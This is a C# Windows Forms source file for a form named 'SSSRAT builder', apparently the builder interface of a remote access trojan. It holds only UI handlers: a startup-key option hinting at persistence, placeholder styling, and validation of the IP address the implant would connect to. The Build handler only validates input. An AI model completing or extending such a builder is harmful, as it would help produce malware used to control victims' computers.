using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SSSRAT_builder {
	public partial class frm_build : Form {
		public frm_build() {
			InitializeComponent();
		}

		private void CheckBox1CheckedChanged(object sender, EventArgs e) {
			t_startupKey.Enabled = chk_startup.Checked;
		}

		private void TStartupKeyEnter(object sender, EventArgs e) {
			if (t_startupKey.Text == "" || t_startupKey.Text == "Startup key") {
				t_startupKey.Text = String.Empty;
				t_startupKey.ForeColor = Color.Black;
				t_startupKey.Font = new Font(t_startupKey.Font.FontFamily,
											 t_startupKey.Font.Size,
											 FontStyle.Regular);
			}
		}

		private void TStartupKeyLeave(object sender, EventArgs e) {
			if (t_startupKey.Text == "") {
				t_startupKey.Text = "Startup key";
				t_startupKey.ForeColor = Color.Gray;
				t_startupKey.Font = new Font(t_startupKey.Font.FontFamily,
											 t_startupKey.Font.Size,
											 FontStyle.Italic);
			}
		}

		private void BBuildClick(object sender, EventArgs e) {
			if (!CheckIPSyntax(t_IP.Text)) {
				MessageBox.Show("IP address is in incorrect format", "SSSRAT builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
				t_IP.Text = "";
				return;
			}
		}

		private void TIPLeave(object sender, EventArgs e) {
			if (!CheckIPSyntax(t_IP.Text)) {
				MessageBox.Show("IP address is in incorrect format", "SSSRAT builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
				t_IP.Text = "";
			}
		}

		public static bool CheckIPSyntax(string IP) {
			try {
				System.Net.IPAddress.Parse(IP);
				return true;
			} catch {
				return false;
			}
		}
	}
}
